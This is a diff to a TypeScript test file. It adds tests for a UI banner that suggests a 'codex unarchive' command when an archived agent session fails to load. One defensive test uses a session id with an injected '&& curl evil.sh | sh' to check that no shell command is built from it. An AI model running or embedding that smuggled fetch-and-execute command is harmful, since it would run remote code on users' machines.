@@ -49,11 +49,19 @@ const h = vi.hoisted(() => {
     pushAlert: vi.fn(),
     sendSystemNotification: vi.fn(async () => undefined),
     toastWarning: vi.fn(),
+    // Every `t(key, values)` this render made. The mock below still returns
+    // the bare key (what most assertions compare against), so interpolated
+    // values would otherwise be unobservable — this is how a test checks the
+    // *arguments* a message was built with, not just which key was picked.
+    tCalls: [] as Array<[string, Record<string, unknown> | undefined]>,
   }
 })
 
 vi.mock("next-intl", () => ({
-  useTranslations: () => (key: string) => key,
+  useTranslations: () => (key: string, values?: Record<string, unknown>) => {
+    h.tCalls.push([key, values])
+    return key
+  },
 }))
 
 vi.mock("@/lib/platform", () => ({
@@ -187,6 +195,7 @@ beforeEach(() => {
   h.acpTouchConnection.mockResolvedValue(true)
   h.acpCancel.mockReset()
   h.acpCancel.mockResolvedValue(undefined)
+  h.tCalls.length = 0
 })
 
 function latestAttachHandlers(): AttachHandlers {
@@ -2271,6 +2280,170 @@ describe("empty-turn error diagnostics", () => {
     expect(h.store!.getConnection(TAB)!.error).toBe(
       "backendErrors.turnFailedEmpty"
     )
+  })
+})
+
+describe("session_load_failed archived-session recovery", () => {
+  async function connectOwner(agentType: string): Promise<AttachHandlers> {
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, agentType, "/tmp/x", "sess-1")
+    })
+    return latestAttachHandlers()
+  }
+
+  // The values the banner was built with, or undefined if it never asked for
+  // that message. (`findLast` is ES2023; this file targets ES2020.)
+  function lastArchivedCall() {
+    const calls = h.tCalls.filter(
+      ([key]) => key === "backendErrors.sessionArchived"
+    )
+    return calls[calls.length - 1]
+  }
+
+  const ARCHIVED_SID = "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47"
+  // What codex-acp actually answers session/load with after `codex archive`:
+  // a generic -32603 whose data spells out the session and the way back.
+  const RAW = `Internal error: {\n  "details": "session ${ARCHIVED_SID} is archived. Run \`codex unarchive ${ARCHIVED_SID}\` to restore it."\n}`
+
+  it("names the unarchive command using the id off the event, not the error body", async () => {
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(
+      "backendErrors.sessionArchived"
+    )
+    // The point of the banner: the exact command, built from the session the
+    // load failed for — no scraping of the (reword-able) error body.
+    expect(lastArchivedCall()?.[1]?.command).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+    // Parked beside the message too: the banner renders the prose in a
+    // single-line ellipsized strip, so the copy action is what actually
+    // gets the id into the user's hands.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+  })
+
+  it("still names the command when the error body does not spell out the id", async () => {
+    // The id is carried by the event, so the banner survives codex rewording
+    // its error text — the failure mode of recovering the id from the body.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: "Internal error: this session is archived",
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(
+      "backendErrors.sessionArchived"
+    )
+    expect(lastArchivedCall()?.[1]?.command).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+    // Parked beside the message too: the banner renders the prose in a
+    // single-line ellipsized strip, so the copy action is what actually
+    // gets the id into the user's hands.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+  })
+
+  it("refuses to build a shell command from a session id that isn't one", async () => {
+    // The command is meant to be pasted into a shell, so the id must be the
+    // whole of what gets interpolated. An id carrying a space and a second
+    // word would otherwise arrive as a second command.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47 && curl evil.sh | sh",
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+  })
+
+  it("offers no command for the load failures that have no way back", async () => {
+    // resource_not_found / session_unavailable are genuinely lost sessions;
+    // a copy button would imply a recovery that does not exist.
+    const handlers = await connectOwner("codex")
+
+    const codes = ["resource_not_found", "session_unavailable"] as const
+    codes.forEach((code, i) => {
+      emitAcpEvent(handlers, {
+        seq: i + 1,
+        connection_id: "spawned-conn",
+        type: "session_load_failed",
+        session_id: ARCHIVED_SID,
+        message: RAW,
+        code,
+      })
+      expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    })
+  })
+
+  it("drops the command when the load error is cleared", async () => {
+    // Reload clears the banner; a stale command would outlive the failure it
+    // belongs to and reappear beside the next one.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).not.toBeNull()
+
+    act(() => {
+      h.actions!.clearAcpLoadError(TAB)
+    })
+    expect(h.store!.getConnection(TAB)!.loadError).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+  })
+
+  it("keeps the agent's own text rather than prescribing a codex command to a non-codex agent", async () => {
+    // The backend classifies on the wire message, so "is archived" is not
+    // codex-exclusive by construction. Telling a Claude user to run
+    // `codex unarchive` would be worse than showing the raw text.
+    const handlers = await connectOwner("claude_code")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+    expect(
+      h.tCalls.some(([key]) => key === "backendErrors.sessionArchived")
+    ).toBe(false)
+    // No command either — the copy button must not appear offering a codex
+    // incantation to a Claude session.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
   })
 })
 
